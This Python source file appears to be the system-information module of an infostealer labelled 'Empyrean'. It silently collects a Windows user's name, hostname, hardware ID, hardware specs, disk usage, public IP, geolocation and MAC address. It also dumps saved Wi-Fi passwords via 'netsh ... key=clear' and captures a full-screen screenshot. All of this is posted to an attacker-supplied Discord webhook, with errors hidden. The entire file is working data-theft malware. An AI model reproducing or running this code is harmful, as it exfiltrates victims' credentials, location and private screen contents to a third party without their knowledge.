import ctypes
import os
import re
import subprocess
import uuid

import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
import time
import tempfile

class SystemInfo():
    def __init__(self, webhook_url: str) -> None:
     with tempfile.TemporaryDirectory() as tmpdir:
        webhook = SyncWebhook.from_url(webhook_url)
        embed = Embed(title="System Information", color=0x000000)
        (
            user_data,
            system_data,
            network_data,
            disk_data,
            wifi_data
        ) = (
            self.user_data(),
            self.system_data(),
            self.network_data(),
            self.disk_data(),
            self.wifi_data()
        )
        embed.add_field(
            name=user_data[0],
            value=user_data[1],
            inline=user_data[2]
        )
        embed.add_field(
            name=system_data[0],
            value=system_data[1],
            inline=system_data[2]
        )
        embed.add_field(
            name=disk_data[0],
            value=disk_data[1],
            inline=disk_data[2]
        )
        embed.add_field(
            name=network_data[0],
            value=network_data[1],
            inline=network_data[2]
        )
        embed.add_field(
            name=wifi_data[0],
            value=wifi_data[1],
            inline=wifi_data[2]
        )

        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(f'{tmpdir}/ss.png')
        embed.set_image(url="attachment://screenshot.png")

        try:
            webhook.send(
                embed=embed,
                file=File(f'{tmpdir}/ss.png', filename='screenshot.png'),
                username="Empyrean",
                avatar_url="https://i.imgur.com/HjzfjfR.png"
            )
        except:
            pass

        if os.path.exists(f'{tmpdir}/ss.png'):
            os.remove(f'{tmpdir}/ss.png')

    def user_data(self) -> tuple[str, str, bool]:
        def display_name() -> str:
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3

            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)

            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)

            return nameBuffer.value

        
        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv('USERNAME')
        try:
            display_name = display_name()
        except:
            display_name = username
        return (
            ":bust_in_silhouette: User",
            f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
            False
        )

    def system_data(self) -> tuple[str, str, bool]:
        def get_hwid() -> str:
         try:
            hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').splitlines()[1].strip()
         except:
          try: # For Windows 11+
            hwid = subprocess.check_output('powershell "(Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"').decode('utf-8').strip()
          except:
            hwid = 'WTF'
         hwid = hwid.upper()
         return hwid

        cpu = wmi.WMI().Win32_Processor()[0].Name
        gpu = wmi.WMI().Win32_VideoController()[0].Name
        
        #ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
        ram = round(psutil.virtual_memory().total / 1073741824, 1)
        hwid = get_hwid()

        return (
            "<:CPU:1004131852208066701> System",
            f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
            False
        )

    def disk_data(self) -> tuple[str, str, bool]:
        disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
        for part in psutil.disk_partitions(all=False):
         if os.name == 'nt':
            if 'cdrom' in part.opts or part.fstype == '':
                continue
         try:
            usage = psutil.disk_usage(part.mountpoint)
            disk += ("{:<9} "*4).format(part.device, str(
                usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
         except: # ignore if bitlocker turned on
            continue
        return (
            ":floppy_disk: Disk",
            f"```{disk}```",
            False
        )

    def network_data(self) -> tuple[str, str, bool]:
        def geolocation(ip: str) -> str:
            url = f"https://ipapi.co/{ip}/json/"
            response = requests.get(url, headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
            data = response.json()

            return (data["country"], data["region"], data["city"], data["postal"], data["asn"])

        ip = requests.get(
            "https://www.cloudflare.com/cdn-cgi/trace").text.split("ip=")[1].split("\n")[0]
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        country, region, city, zip_, as_ = geolocation(ip)

        return (
            ":satellite: Network",
            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
            False
        )

    def wifi_data(self) -> tuple[str, str, bool]:
        networks, out = [], ''
        try:
            wifi = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
            wifi = [i.split(":")[1][1:-1]
                    for i in wifi if "All User Profile" in i]

            for name in wifi:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1]
                               for b in results if "Key Content" in b]
                except subprocess.CalledProcessError:
                    networks.append((name, ''))
                    continue

                try:
                    networks.append((name, results[0]))
                except IndexError:
                    networks.append((name, ''))

        except subprocess.CalledProcessError:
            pass
        except UnicodeDecodeError:
            pass

        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
        out += f'{"-"*20}|{"-"*29}\n'
        for name, password in networks:
            out += '{:<20}| {:<}\n'.format(name, password)

        return (
            ":signal_strength: WiFi",
            f"```{out}```",
            False
        )
